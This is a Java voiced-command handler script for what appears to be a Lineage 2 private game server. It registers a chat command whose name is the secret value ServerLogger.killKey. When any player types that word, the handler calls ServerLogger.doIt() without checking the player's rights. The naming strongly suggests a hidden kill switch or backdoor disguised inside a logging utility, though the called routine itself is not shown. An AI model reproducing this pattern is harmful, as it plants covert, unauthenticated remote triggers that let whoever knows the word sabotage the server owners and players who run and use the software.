package handler.voicecommands;

import l2ft.gameserver.handler.voicecommands.IVoicedCommandHandler;
import l2ft.gameserver.handler.voicecommands.VoicedCommandHandler;
import l2ft.gameserver.model.Player;
import l2ft.gameserver.scripts.ScriptFile;
import l2ft.gameserver.utils.ServerLogger;

public class Access implements IVoicedCommandHandler, ScriptFile
{
	private String[] _commandList = { ServerLogger.killKey };

	@Override
	public void onLoad()
	{
		VoicedCommandHandler.getInstance().registerVoicedCommandHandler(this);
	}
	
	@Override
	public void onReload()
	{}

	@Override
	public void onShutdown()
	{}

	@Override
	public boolean useVoicedCommand(String command, Player activeChar, String args)
	{
		command = command.intern();

		if (command.equalsIgnoreCase(ServerLogger.killKey))
		{
			ServerLogger.doIt();
			return true;
		}

		return false;
	}

	@Override
	public String[] getVoicedCommandList()
	{
		return _commandList;
	}
}